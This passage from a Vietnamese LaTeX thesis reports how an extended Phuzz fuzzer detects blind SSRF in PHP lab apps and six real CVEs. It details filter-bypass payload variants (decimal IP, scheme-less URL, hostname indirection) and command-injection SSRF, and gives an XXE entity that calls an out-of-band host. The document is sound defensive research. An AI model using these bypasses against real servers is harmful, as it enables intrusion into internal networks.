\texttt{shell\_exec} trong \texttt{08\_ssrf.php} ghi nhận lời gọi; OOB
server nhận callback từ \texttt{curl}. Trường hợp này mở rộng phạm vi
phát hiện sang lớp lỗ hổng kết hợp Command Injection và SSRF.

\textbf{bWAPP RFI (L7) và Mutillidae RFI (L8).} Hai trường hợp Remote
File Inclusion sử dụng language construct của PHP: \texttt{include(\$language)}
trong bWAPP (\texttt{rlfi.php}, security level 0) và
\texttt{require\_once(\$page)} trong Mutillidae (\texttt{index.php},
security level 0). Language construct là cấu trúc ngôn ngữ, không thể
hook bằng \texttt{uopz\_set\_hook}. Thay vào đó,
\texttt{09\_ssrf\_stream.php} đăng ký lại PHP stream wrapper
\texttt{http://}, chặn mọi lần PHP mở URL qua giao thức HTTP, kể cả từ
\texttt{include} và \texttt{require\_once}. Biến thể v0 kích hoạt stream
wrapper và OOB callback nhận được. Kết quả xác nhận lớp phát hiện qua
stream wrapper là thành phần bổ sung không thể thiếu bên cạnh hook UOPZ.

% ============================================================
\section{Kết quả Nhóm CVE}
\label{sec:exp-cve}
% ============================================================

\subsection{Kết quả tổng hợp}

Bảng~\ref{tab:cve-results} tóm tắt kết quả phát hiện cho sáu CVE.

\begin{table}[h]{Kết quả phát hiện SSRF trên nhóm CVE}
\label{tab:cve-results}
\centering
\small
\begin{tabular}{|c|l|l|l|c|c|}
\hline
\textbf{ID} & \textbf{CVE} & \textbf{Biến thể phát hiện} & \textbf{Auth} & \textbf{P+S} & \textbf{P} \\
\hline
C1 & CVE-2020-7071  & v0 (plain IP)        & Không  & \checkmark & \ding{55} \\
C2 & CVE-2020-24148 & v0 (plain IP)        & Admin  & \checkmark & \ding{55} \\
C3 & CVE-2020-28975 & v20 (scheme-less)    & Không  & \checkmark & \ding{55} \\
C4 & CVE-2021-32682 & v19 (hostname)       & Không  & \checkmark & \ding{55} \\
C5 & CVE-2022-1751  & v0 (plain IP)        & Không  & \checkmark & \ding{55} \\
C6 & CVE-2023-2249  & v0 (plain IP)        & User   & \checkmark & \ding{55} \\
\hline
\multicolumn{4}{|l|}{\textbf{Tổng}} & \textbf{6/6} & \textbf{0/6} \\
\hline
\end{tabular}
\end{table}

\subsection{CVE-2020-7071 --- Bypass \texttt{filter\_var} trong PHP}

Ứng dụng kiểm tra URL đầu vào bằng \texttt{filter\_var(\$url,
FILTER\_VALIDATE\_URL)} trước khi truyền vào
\texttt{file\_get\_contents}. Trên PHP 7.4.13 (phiên bản có lỗi
CVE-2020-7071), \texttt{filter\_var} chấp nhận URL dạng
\texttt{http://172.20.0.10/} là hợp lệ --- đây chính là nội dung của
lỗ hổng: hàm kiểm tra URL không phân biệt địa chỉ nội bộ và địa chỉ
công khai. Biến thể v0 (plain IP) vượt qua được kiểm tra này và kích
hoạt OOB callback. Container web sử dụng \texttt{Dockerfile.php74} để
đảm bảo đúng phiên bản PHP 7.4 có lỗi.

\subsection{CVE-2020-24148 --- Import XML Feed (WordPress Plugin)}

Plugin Import XML Feed $\leq$ 2.0.0 có endpoint AJAX
\texttt{moove\_read\_xml} yêu cầu quyền admin nhưng không kiểm tra
nonce. Fuzzer đăng nhập với tài khoản admin thông qua module session
management của Phuzz, rồi đột biến tham số \texttt{data} với payload
OOB. Sink function là \texttt{file\_get\_contents}; phát hiện với v0.
Thời gian phát hiện đạt \textbf{$\approx$506 giây} --- cao nhất trong
toàn bộ thực nghiệm, chủ yếu do overhead từ WordPress bootstrap (khởi
động MySQL và WordPress init sequence) và quá trình xác thực admin. Với
giới hạn 600 giây, biên độ an toàn không lớn; đây cũng là một trong
các hạn chế được thảo luận ở Chương~5.

\subsection{CVE-2020-28975 --- Canto 1.3.0 WordPress Plugin}

Plugin Canto 1.3.0 xây dựng URL theo mẫu cứng
\texttt{https://\{subdomain\}.\{app\_api\}/api/v1/...} rồi gọi cURL
với \texttt{CURLOPT\_SSL\_VERIFYPEER = false}. Đây là trường hợp đặc
biệt: các biến thể IP-based (v0--v14) đều không hoạt động vì IP được
nhúng vào vị trí subdomain tạo ra URL dạng
\texttt{https://172.20.0.10.x/...} --- chuỗi này không hợp lệ về mặt
DNS và cURL thất bại ở bước phân giải.

Hệ thống phát hiện qua \textbf{biến thể v20} (scheme-less:
\texttt{oob.phuzz:8443/<token>\#}): khi Canto nhận
\texttt{subdomain = "oob.phuzz:8443/<token>\#"}, URL được xây dựng
thành \texttt{https://oob.phuzz:8443/<token>\#.x/api/v1/...}. cURL
phân tích \texttt{oob.phuzz:8443} là host và \texttt{/<token>} là path;
phần sau \texttt{\#} là fragment bị bỏ qua. Entry \texttt{extra\_hosts}
trong Docker phân giải \texttt{oob.phuzz $\rightarrow$ 172.20.0.10}; OOB
HTTPS listener (cổng 8443, SSL verification disabled) nhận callback và
ghi log.

\subsection{CVE-2021-32682 --- elFinder $<$ 2.1.59}

elFinder triển khai kiểm tra địa chỉ IP nội bộ (RFC~1918) trong hàm
\texttt{get\_remote\_contents()} bằng regex trên chuỗi URL. Các biến
thể IP trực tiếp (plain, decimal, hex, octal, IPv6) đều bị chặn tại
tầng kiểm tra chuỗi này trước khi đến \texttt{file\_get\_contents}.

Hệ thống phát hiện qua \textbf{biến thể v19}
(\texttt{http://oob.phuzz:8000/<token>}): hostname \texttt{oob.phuzz}
không khớp với bất kỳ pattern RFC~1918 nào trong regex của elFinder,
nên \texttt{file\_get\_contents} được gọi với URL này. Entry
\texttt{extra\_hosts} trong Docker phân giải
\texttt{oob.phuzz $\rightarrow$ 172.20.0.10} ở tầng OS; OOB server nhận
callback. Đây là ví dụ điển hình của kỹ thuật bypass
\textit{hostname indirection}: cơ chế lọc kiểm tra biểu diễn chuỗi của
URL thay vì kiểm tra địa chỉ IP thực sự sau DNS resolution.

\subsection{CVE-2022-1751 --- WP Skitter Slideshow}

Plugin \texttt{wp-skitter-slideshow} gọi
\texttt{getimagesize(\$\_GET['image'])} trực tiếp trên URL người dùng
cung cấp trong file \texttt{image.php} mà không qua WordPress bootstrap.
\texttt{getimagesize} là hàm xử lý ảnh, không phải hàm mạng điển hình,
nhưng PHP triển khai nó với khả năng fetch URL từ xa qua HTTP wrapper
khi đối số là URL bắt đầu bằng \texttt{http://}. Trường hợp này xác
nhận tầm quan trọng của việc hook đủ rộng: nhóm Network/HTTP trong
\texttt{08\_ssrf.php} bao gồm \texttt{getimagesize} bên cạnh
\texttt{file\_get\_contents} và các hàm mạng thông thường. Biến thể v0
kích hoạt OOB callback mà không yêu cầu xác thực. Plugin đã bị đóng
trên WordPress.org; mã nguồn lấy từ GitHub mirror.

\subsection{CVE-2023-2249 --- wpForo Profile Cover Upload}

Plugin wpForo $\leq$ 2.1.7 cho phép thành viên đã đăng nhập ở mức
Subscriber cập nhật ảnh bìa profile bằng URL. Endpoint AJAX
\texttt{wpforo\_upload\_remote\_image} fetch URL ảnh phía server thông
qua \texttt{file\_get\_contents} mà không kiểm tra địa chỉ đích. Fuzzer
đăng nhập với tài khoản subscriber (\texttt{subscriber1/subscriber1}),
rồi đột biến tham số \texttt{image\_blob} với v0. Đây là SSRF
\textit{authenticated} ở mức quyền thấp nhất, xác nhận hệ thống xử lý
đúng session management cấp user thông thường bên cạnh cấp admin.

% ============================================================
\section{Tổng hợp và Đánh giá}
\label{sec:exp-summary}
% ============================================================

\subsection{Kết quả tổng thể}

Bảng~\ref{tab:overall} tổng hợp kết quả trên toàn bộ 14 ca kiểm thử.

\begin{table}[h]{Tổng hợp kết quả theo nhóm}
\label{tab:overall}
\centering
\begin{tabular}{|l|c|c|c|c|}
\hline
\textbf{Nhóm} & \textbf{Tổng ca} & \textbf{P+S phát hiện} & \textbf{P phát hiện} & \textbf{FP} \\
\hline
Lab (8 ứng dụng, 11 endpoint) & 8  & 8 (100\%) & 0 & 0 \\
CVE                            & 6  & 6 (100\%) & 0 & 0 \\
\hline
\textbf{Tổng}                 & \textbf{14} & \textbf{14 (100\%)} & \textbf{0} & \textbf{0} \\
\hline
\end{tabular}
\end{table}

\begin{table}[h]{Phân bố sink function được kích hoạt}
\label{tab:sinks}
\centering
\begin{tabular}{|l|c|l|}
\hline
\textbf{Sink function} & \textbf{Số run} & \textbf{Nhóm hook} \\
\hline
\texttt{file\_get\_contents}                      & 8  & Network/HTTP (\texttt{08\_ssrf.php}) \\
\texttt{curl\_exec}                                & 5  & cURL (\texttt{08\_ssrf.php}) \\
\texttt{include} / \texttt{require\_once} (stream) & 2  & Stream wrapper (\texttt{09\_ssrf\_stream.php}) \\
\texttt{shell\_exec}                               & 1  & Shell Execution (\texttt{08\_ssrf.php}) \\
\texttt{getimagesize}                              & 1  & Network/HTTP (\texttt{08\_ssrf.php}) \\
\hline
\textbf{Tổng}                                     & \textbf{17} & \\
\hline
\end{tabular}
\end{table}

\begin{table}[h]{Phân bố biến thể bypass được sử dụng}
\label{tab:variants}
\centering
\begin{tabular}{|l|c|l|}
\hline
\textbf{Biến thể} & \textbf{Số run} & \textbf{Áp dụng cho} \\
\hline
v0  (plain IP \texttt{172.20.0.10})
  & 12 & L1, L2$\times$2, L3-basic, L4-fgc, L5, L7, L8, C1, C2, C5, C6 \\
v1  (decimal IP \texttt{2886795274})
  & 1  & L3-advanced1 (bypass filter chuỗi IP) \\
v15 (DNS: \texttt{<token>.oob:8000/})
  & 1  & L4-dns\_rebinding \\
v19 (hostname: \texttt{oob.phuzz:8000/<token>})
  & 1  & C4 (elFinder, bypass RFC~1918 regex) \\
v20 (scheme-less: \texttt{oob.phuzz:8443/<token>\#})
  & 1  & C3 (Canto, bypass URL template) \\
Ck  (semicolon cmd inj.)
  & 1  & L6 (DVWA \texttt{shell\_exec}) \\
\hline
\textbf{Tổng} & \textbf{17} & \\
\hline
\end{tabular}
\end{table}

\subsection{Phân tích kết quả}

\textbf{Tỷ lệ phát hiện và False Positive.}
Hệ thống đề xuất đạt tỷ lệ phát hiện \textbf{14/14 (100\%)} trên toàn
bộ 14 ca kiểm thử, với tỷ lệ false positive bằng 0. Mỗi báo cáo đều
có đủ hai file bằng chứng (\texttt{ssrf-hooks/<ID>.json} và
\texttt{oob-logs/<token>.json}), xác nhận ứng dụng đã thực sự thực
hiện kết nối mạng tới OOB server. Ngược lại, Phuzz gốc không phát hiện
được bất kỳ trường hợp nào (0/14), khẳng định thực nghiệm rằng tín
hiệu coverage và exception hoàn toàn bất lực trước Blind SSRF.

\textbf{Tầm quan trọng của đa biến thể bypass.}
Bảng~\ref{tab:variants} cho thấy biến thể plain IP (v0) chiếm đa số
(12/17 run), nhưng năm run còn lại chỉ phát hiện được qua biến thể
đặc thù: Canto (C3) cần v20 do cơ chế xây dựng URL template; elFinder
(C4) cần v19 để bypass kiểm tra chuỗi RFC~1918; ssrf-vul-lab
dns\_rebinding cần v15 (DNS-based) để hoạt động trong môi trường có
DNS resolution; ssrf-lab advanced1 cần v1 để bypass filter chuỗi IP;
DVWA cần \texttt{CmdInjectionSSRFMutator}. Nếu hệ thống chỉ có biến
thể plain IP, tỷ lệ phát hiện sẽ giảm từ 100\% xuống khoảng 71\%
(12/17 run) ở mức endpoint và còn thấp hơn ở mức ứng dụng.

\textbf{Tầm quan trọng của hook rộng.}
Bảng~\ref{tab:sinks} cho thấy năm loại sink function khác nhau được
kích hoạt. Đặc biệt, \texttt{getimagesize} (C5) và cặp
\texttt{include}/\texttt{require\_once} qua stream wrapper (L7, L8) là
những sink không trực quan mà hầu hết công cụ bảo mật không theo dõi.
Phát hiện CVE-2022-1751 là bằng chứng rõ ràng: nếu thiếu hook
\texttt{getimagesize}, lỗ hổng này sẽ bị bỏ sót hoàn toàn. Tương tự,
nếu chỉ có hook UOPZ mà thiếu stream wrapper, bWAPP (L7) và Mutillidae
(L8) --- hai trường hợp RFI qua language construct --- sẽ không được
phát hiện.

\textbf{SSRF gián tiếp qua Command Injection (L6).}
DVWA là ví dụ về SSRF gián tiếp: tham số đầu vào không đi vào hàm
mạng mà đi vào shell command. \texttt{CmdInjectionSSRFMutator} và hook
nhóm Shell Execution xử lý đúng kịch bản này, mở rộng phạm vi phát
hiện sang lớp lỗ hổng kết hợp Command Injection và SSRF.

\textbf{Xác thực đa mức.}
Thực nghiệm bao phủ ba mức xác thực: không cần đăng nhập (L1--L4, C1,
C3--C5), đăng nhập user thông thường (L5--L8, C6), và đăng nhập admin
(C2). Trong tất cả trường hợp yêu cầu xác thực, module session
management của Phuzz xử lý đúng quy trình đăng nhập và duy trì session
cho các request tiếp theo, không làm gián đoạn vòng lặp fuzzing.

\section{Tổng kết Chương}

Thực nghiệm trên 14 ca kiểm thử (8 ứng dụng lab với tổng cộng 11
endpoint, 6 CVE) cho thấy hệ thống đề xuất đạt tỷ lệ phát hiện 100\%
với 0 false positive, trong khi Phuzz gốc không phát hiện được bất kỳ
trường hợp nào. Kết quả đặc biệt đáng chú ý gồm: (1) Canto (C3) và
elFinder (C4) chỉ phát hiện được qua biến thể đặc thù (scheme-less và
hostname indirection), đòi hỏi tập biến thể đa dạng hơn plain IP; (2)
CVE-2022-1751 kích hoạt sink \texttt{getimagesize} --- hàm ảnh không
được hầu hết công cụ coi là điểm SSRF; (3) bWAPP (L7) và Mutillidae
(L8) chứng minh sự cần thiết của lớp phát hiện qua stream wrapper bên
cạnh hook UOPZ. Chương~5 tổng kết đóng góp và thảo luận hướng phát
triển.

\chapter{Kết luận và Hướng Phát triển}

% ============================================================
\section{Kết luận}
\label{sec:conclusion}
% ============================================================

Khóa luận này xuất phát từ một quan sát thực tế: mặc dù greybox fuzzing
là hướng tiếp cận mạnh mẽ nhất hiện nay trong kiểm thử bảo mật tự động,
toàn bộ các công cụ thuộc thế hệ này --- bao gồm Phuzz, webFuzz, và
Witcher --- đều bỏ sót hoàn toàn lớp lỗ hổng Blind SSRF. Nguyên nhân
cốt lõi là vòng lặp fuzzing truyền thống chỉ quan sát hai tín hiệu:
độ phủ mã và ngoại lệ. Blind SSRF không để lại dấu vết trong cả hai
kênh này --- ứng dụng vẫn chạy bình thường, không có exception, không
có dòng code mới, chỉ có một kết nối mạng âm thầm được thực hiện ở
tầng hệ điều hành.

Hướng giải quyết được đề xuất là \textbf{bổ sung kênh tín hiệu
Out-of-Band} vào vòng lặp fuzzing, thay vì cố gắng suy luận từ các
tín hiệu hiện có. Nếu dấu vết duy nhất của Blind SSRF là kết nối mạng
tới địa chỉ ngoài mong đợi, ta đặt một máy chủ lắng nghe tại địa chỉ
đó và đưa tín hiệu callback trở lại vòng lặp như một kênh phản hồi độc
lập.

\subsection{Đóng góp của khóa luận}

Khóa luận đã thiết kế và cài đặt đầy đủ bốn thành phần mới tích hợp
vào nền tảng Phuzz:

\textbf{1. Bộ đột biến SSRF chuyên biệt.} \texttt{SSRFMutator} sinh
payload OOB theo round-robin qua 21 biến thể, tổ chức thành ba nhóm
(IP-based, DNS-based, hostname-based) để bao phủ các cơ chế lọc đầu
vào phổ biến. \texttt{CmdInjectionSSRFMutator} bổ sung 10 biến thể
command injection cho các endpoint có nguy cơ lệnh shell. Thiết kế
nhiều biến thể được chứng minh là cần thiết trong thực tế: hai trong
sáu CVE được kiểm thử --- Canto (CVE-2020-28975) và elFinder
(CVE-2021-32682) --- chỉ phát hiện được qua biến thể đặc thù
(scheme-less bypass và hostname indirection), không phải biến thể
plain IP thông thường.

\textbf{2. Máy chủ OOB lắng nghe.} Container \texttt{phuzz-oob} chạy
Flask HTTP/HTTPS listener và dnsmasq phân giải wildcard DNS
\texttt{*.oob}. Cơ chế ghi log nguyên tử (\texttt{os.rename}) trên
shared-tmpfs đảm bảo fuzzer không bao giờ đọc file chưa hoàn chỉnh.
Thiết kế container độc lập cho phép tái sử dụng OOB server với bất kỳ
ứng dụng mục tiêu nào mà không cần sửa đổi.

\textbf{3. Lớp hook PHP hai tầng.} \texttt{SSRFVulnCheck} kết hợp
tín hiệu in-band (PHP hook ghi nhận lời gọi hàm mạng) và tín hiệu OOB
(callback từ ứng dụng mục tiêu) theo logic AND: chỉ khi cả hai file
bằng chứng cùng tồn tại mới xác nhận lỗ hổng. Module hook
\texttt{08\_ssrf.php} triển khai 23 hook trên 5 nhóm hàm qua UOPZ,
bao phủ từ \texttt{curl\_exec}, \texttt{file\_get\_contents}, các hàm
socket, shell execution, đến WordPress HTTP API wrappers.

\textbf{4. PHP stream wrapper.} \texttt{09\_ssrf\_stream.php} đăng ký
lại built-in wrapper cho scheme \texttt{http} và \texttt{https}, cho
phép interceptsâu language construct \texttt{include} và
\texttt{require\_once} mà UOPZ không thể hook. Lớp này lấp khoảng
trống phát hiện cho lớp lỗ hổng Remote File Inclusion (RFI) --- được
xác nhận qua thực nghiệm với bWAPP và Mutillidae.

\subsection{Kết quả thực nghiệm}

Thực nghiệm trên 14 ca kiểm thử (8 ứng dụng lab với tổng cộng 11
endpoint, 6 CVE thực tế) cho thấy:

\begin{itemize}
    \item \textbf{Tỷ lệ phát hiện: 14/14 (100\%)} --- toàn bộ lỗ hổng
    SSRF trên các mục tiêu đã kiểm thử đều được phát hiện.
    \item \textbf{False positive: 0} --- cơ chế AND logic hai tầng
    đảm bảo mỗi báo cáo đều có bằng chứng mạng thực tế.
    \item \textbf{Phuzz gốc: 0/14} --- xác nhận thực nghiệm rằng tín
    hiệu truyền thống hoàn toàn bất lực trước Blind SSRF.
    \item Năm loại sink function khác nhau được bao phủ:
    \texttt{file\_get\_contents}, \texttt{curl\_exec},
    \texttt{include}/\texttt{require\_once} (qua stream wrapper),
    \texttt{shell\_exec}, và \texttt{getimagesize} --- hai loại cuối là
    sink không trực quan mà hầu hết công cụ khác bỏ sót.
\end{itemize}

Kết quả này khẳng định rằng \textbf{mở rộng kênh tín hiệu phản hồi
là hướng tiếp cận khả thi và hiệu quả} để lấp khoảng trống mà các
greybox fuzzer truyền thống để lại.

% ============================================================
\section{Hạn chế}
\label{sec:limitations}
% ============================================================

Dù đạt kết quả khả quan, hệ thống hiện tại có một số hạn chế cần
nhìn nhận thẳng thắn:

\textbf{Phạm vi ngôn ngữ.} Hệ thống chỉ hỗ trợ PHP. Các ứng dụng
viết bằng Python (Django, Flask), Node.js, hay Java/Spring đều nằm
ngoài tầm bao phủ hiện tại, dù kiến trúc OOB listener và cơ chế
phát hiện hai tầng về nguyên lý có thể áp dụng cho bất kỳ ngôn ngữ
nào.

\textbf{Stored SSRF.} Hệ thống không xử lý được Stored SSRF --- dạng
tấn công trong đó payload được lưu vào database và kích hoạt SSRF ở
một request hoàn toàn khác sau đó. Trong trường hợp này, token từ
request gốc và OOB callback từ request thứ cấp không có cơ chế tự
động liên kết.

\textbf{Thời gian phát hiện trên WordPress.} CVE-2020-24148 mất
khoảng 506 giây để phát hiện, chủ yếu do overhead từ WordPress
bootstrap và quá trình đăng nhập. Với giới hạn thời gian 600 giây,
biên độ an toàn không lớn; các ứng dụng WordPress phức tạp hơn có
thể vượt giới hạn này.

\textbf{Quy mô thực nghiệm.} 14 ca kiểm thử là đủ để kiểm chứng
nguyên lý, nhưng chưa đủ để kết luận thống kê về tỷ lệ phát hiện
tổng quát. Thực nghiệm trên tập lỗ hổng lớn hơn (hàng trăm CVE SSRF)
sẽ cung cấp đánh giá tin cậy hơn.

\textbf{Phụ thuộc vào kết nối mạng từ container.} OOB server phải
tiếp cận được từ container web. Trong môi trường production với tường
lửa egress nghiêm ngặt, container web không thể kết nối ra ngoài và
cơ chế OOB sẽ không hoạt động. Tuy nhiên đây là đặc điểm của môi
trường kiểm thử cục bộ (fuzzing lab), không phải môi trường production.

% ============================================================
\section{Hướng Phát triển Tương lai}
\label{sec:future}
% ============================================================

\textbf{Mở rộng sang ngôn ngữ khác.} Hướng tiếp cận tự nhiên nhất
là xây dựng module hook tương đương cho Python (\texttt{urllib},
\texttt{requests}, \texttt{httpx}), Node.js (\texttt{http},
\texttt{https}, \texttt{fetch}), và Java (\texttt{HttpURLConnection},
\texttt{OkHttpClient}). OOB server và logic phát hiện hai tầng có thể
giữ nguyên; chỉ cần thay module hook theo ngôn ngữ mục tiêu.

\textbf{Xử lý Stored SSRF.} Một hướng tiếp cận khả thi là theo dõi
thư mục \texttt{oob-logs/} liên tục trong suốt quá trình fuzzing, kể
cả sau khi request gốc đã kết thúc. Token được lưu vào
\texttt{\_token\_map} với timestamp; nếu callback đến muộn, fuzzer
có thể tra cứu token và liên kết với ứng viên gốc theo cơ chế
\textit{deferred lookup} đã đặt nền trong thiết kế hiện tại.

\textbf{Mở rộng sang các lớp lỗ hổng OOB khác.} Phương pháp tín hiệu
OOB không chỉ áp dụng cho SSRF. Các lớp lỗ hổng khác có đặc điểm
tương tự --- không để lại dấu vết trong response --- cũng có thể hưởng
lợi: XXE với DNS exfiltration (\texttt{<!DOCTYPE x [<!ENTITY xxe
SYSTEM "http://oob-server/...">]>}), SQL injection out-of-band
(\texttt{LOAD\_FILE} hay DNS lookup trong MySQL), hay Log4Shell-style
JNDI injection. Kiến trúc OOB server và cơ chế token đã xây dựng có
thể được tái sử dụng trực tiếp.

\textbf{Tăng cường bộ payload bypass.} Tập 21 biến thể hiện tại được
xây dựng dựa trên các kỹ thuật bypass đã biết. Trong thực tế, mỗi
framework và thư viện HTTP có hành vi URL parsing khác nhau, tạo ra
các bypass mới liên tục. Hướng phát triển là tích hợp cơ sở dữ liệu
bypass từ các nguồn như PayloadsAllTheThings và cập nhật bộ mutator
tự động.

\textbf{Tích hợp vào pipeline CI/CD.} Hiện tại hệ thống được chạy
thủ công theo từng target. Một hướng thực tế là đóng gói thành một
Docker image tự chứa có thể tích hợp trực tiếp vào pipeline CI/CD,
tự động quét SSRF mỗi khi có pull request chạm tới code xử lý URL
người dùng.

\textbf{Báo cáo tự động với Proof-of-Concept.} Hiện tại \texttt{SSRFVulnCheck}
ghi report dạng JSON thô. Một bước cải tiến là tự động tạo PoC request
có thể tái hiện lỗ hổng (curl command với payload đúng), cùng với phân
loại mức độ nghiêm trọng dựa trên sink function và mức xác thực yêu
cầu, giúp triage nhanh cho security engineer.


% ============================================================
%  Tài liệu tham khảo
% ============================================================
\begin{thebibliography}{99}

\begin{bibsection}{Conference and Journal Papers}

\bibitem{miller1990empirical}
B.~P. Miller, L.~Fredriksen, and B.~So,
An Empirical Study of the Reliability of {UNIX} Utilities,''
\textit{Communications of the ACM}, vol.~33, no.~12, pp.~32--44,
Dec. 1990, doi: 10.1145/96267.96279.

\bibitem{neef2024phuzz}
S.~Neef, L.~Kleissner, and J.-P.~Seifert,
What All the {Phuzz} Is About: A Coverage-guided Fuzzer for Finding
Vulnerabilities in {PHP} Web Applications,''
in \textit{Proc. ACM Asia Conf. Computer and Communications Security
(AsiaCCS '24)}, Singapore, Jul. 2024.

\bibitem{fioraldi2020afl}
A.~Fioraldi, D.~Maier, H.~Ei{\ss}feldt, and M.~Heuse,
{AFL++}: Combining Incremental Steps of Fuzzing Research,''
in \textit{Proc. 14th USENIX Workshop Offensive Technologies (WOOT '20)},
USENIX Association, Aug. 2020.

\bibitem{bohme2016coverage}
M.~B{"o}hme, V.-T.~Pham, and A.~Roychoudhury,
Coverage-based Greybox Fuzzing as Markov Chain,''
in \textit{Proc. 23rd ACM SIGSAC Conf. Computer and Communications
Security (CCS '16)}, ACM, Oct. 2016, pp.~1032--1043,
doi: 10.1145/2976749.2978428.

\bibitem{vanrooij2021webfuzz}
O.~van Rooij, M.~A.~Charalambous, D.~Kaizer, M.~Papaevripides,
and E.~Athanasopoulos,
{webFuzz}: Grey-Box Fuzzing for Web Applications,''
in \textit{Computer Security -- ESORICS 2021}, Lecture Notes in
Computer Science, vol.~12972, Springer, Oct. 2021, pp.~152--172,
doi: 10.1007/978-3-030-88418-5\_8.

\bibitem{trickel2023witcher}
E.~Trickel \textit{et al.},
Toss a Fault to Your Witcher: Applying Grey-box Coverage-guided
Mutational Fuzzing to Detect {SQL} and Command Injection Vulnerabilities,''
in \textit{Proc. 44th IEEE Symp. Security and Privacy (S\&P)},
IEEE, May 2023, pp.~116--133,
doi: 10.1109/SP46215.2023.10179419.

\bibitem{li2018fuzzing}
J.~Li, B.~Zhao, and C.~Zhang,
Fuzzing: A Survey,''
\textit{Cybersecurity}, vol.~1, no.~1, pp.~1--13, Dec. 2018,
doi: 10.1186/s42400-018-0002-y.

\bibitem{manes2021art}
V.~J.~M.~Manes \textit{et al.},
The Art, Science, and Engineering of Fuzzing: A Survey,''
\textit{IEEE Trans. Software Engineering}, vol.~47, no.~11,
pp.~2312--2331, Nov. 2021, doi: 10.1109/TSE.2019.2946563.

\bibitem{zhu2022fuzzing}
X.~Zhu, S.~Wen, S.~Camtepe, and Y.~Xiang,
Fuzzing: A Survey for Roadmap,''
\textit{ACM Computing Surveys}, vol.~54, no.~11s, art. 230, Sep. 2022,
doi: 10.1145/3512345.

\bibitem{godefroid2008automated}
P.~Godefroid, M.~Y.~Levin, and D.~A.~Molnar,
Automated Whitebox Fuzz Testing,''
in \textit{Proc. 15th Network and Distributed System Security Symp.
(NDSS '08)}, Internet Society, Feb. 2008, pp.~151--166.

\bibitem{ganesh2009taint}
V.~Ganesh, T.~Leek, and M.~Rinard,
Taint-based Directed Whitebox Fuzzing,''
in \textit{Proc. 31st IEEE/ACM Int. Conf. Software Engineering
(ICSE '09)}, IEEE, May 2009, pp.~474--484,
doi: 10.1109/ICSE.2009.5070546.

\bibitem{godefroid2007random}
P.~Godefroid,
Random Testing for Security: Blackbox vs.\ Whitebox Fuzzing,''
in \textit{Proc. 2nd Int. Workshop on Random Testing (RT '07)},
ACM, 2007, p.~1, doi: 10.1145/1292414.1292416.

\bibitem{doupe2010johnny}
A.~Doup{\'e}, M.~Cova, and G.~Vigna,
Why Johnny Can't Pentest: An Analysis of Black-box Web Vulnerability
Scanners,''
in \textit{Proc. 7th Int. Conf. Detection of Intrusions and Malware,
and Vulnerability Assessment (DIMVA '10)}, Lecture Notes in Computer
Science, vol.~6201, Springer, Jul. 2010, pp.~111--131,
doi: 10.1007/978-3-642-14215-4\_7.

\end{bibsection}

\begin{bibsection}{Standards and Technical Guidelines}

\bibitem{owasp2021top10}
OWASP Foundation,
{OWASP} Top 10:2021 --- The Ten Most Critical Web Application
Security Risks,'' OWASP Foundation, Sep. 2021.
[Online]. Available: \url{https://owasp.org/Top10/}

\bibitem{owasp2023ssrf}
OWASP Foundation,
Server-Side Request Forgery Prevention Cheat Sheet,''
OWASP Foundation, 2023.
[Online]. Available: \url{https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html}

\end{bibsection}

\begin{bibsection}{Software and Tools}

\bibitem{zalewski2014afl}
M.~Zalewski,
{American Fuzzy Lop (AFL)}: A Security-oriented Fuzzer,''
Google, 2014.
[Online]. Available: \url{https://lcamtuf.coredump.cx/afl/}

\bibitem{google2023honggfuzz}
Google,
Honggfuzz: A Security-oriented, Feedback-driven, Evolutionary,
Easy-to-use Fuzzer,'' Google LLC, 2023.
[Online]. Available: \url{https://github.com/google/honggfuzz}

\bibitem{portswigger2023burp}
PortSwigger,
Burp Suite --- The Industry Standard Tool for Web Application
Security Testing,'' PortSwigger Ltd., 2023.
[Online]. Available: \url{https://portswigger.net/burp}

\bibitem{zapdevteam2023}
OWASP ZAP Dev Team,
{OWASP ZAP (Zed Attack Proxy)} --- The World's Most Widely Used
Web App Scanner,'' OWASP Foundation, 2023.
[Online]. Available: \url{https://www.zaproxy.org/}

\bibitem{rethans2002xdebug}
D.~Rethans,
{Xdebug}: Debugger and Profiler Tool for {PHP},''
2002 (updated 2024).
[Online]. Available: \url{https://xdebug.org/}

\bibitem{watkins2023pcov}
J.~Watkins,
{PCOV}: A Code Coverage Driver for {PHP},'' GitHub, 2023.
[Online]. Available: \url{https://github.com/krakjoe/pcov}

\bibitem{phpgroup2023uopz}
The PHP Group,
{UOPZ (User Operations for Zend Engine)} --- {PHP} Manual,''
The PHP Group, 2023.
[Online]. Available: \url{https://www.php.net/manual/en/book.uopz.php}

\bibitem{phpgroup2023history}
The PHP Group,
{PHP}: History of {PHP},''
The PHP Group, 2023.
[Online]. Available: \url{https://www.php.net/manual/en/history.php.php}

\bibitem{w3techs2023php}
Q-Success Web-Quality GmbH,
Usage Statistics and Market Share of {PHP} for Websites,''
W3Techs --- Web Technology Surveys, 2023.
[Online]. Available: \url{https://w3techs.com/technologies/details/pl-php}

\bibitem{docker2023}
Docker Inc.,
Docker: Accelerated, Containerized Application Development,''
Docker Inc., 2023.
[Online]. Available: \url{https://www.docker.com/}

\bibitem{microsoft2024playwright}
Microsoft,
Playwright --- Fast and Reliable End-to-End Testing for Modern
Web Apps,'' Microsoft Corporation, 2024.
[Online]. Available: \url{https://playwright.dev/}

\end{bibsection}

\end{thebibliography}

\end{document}

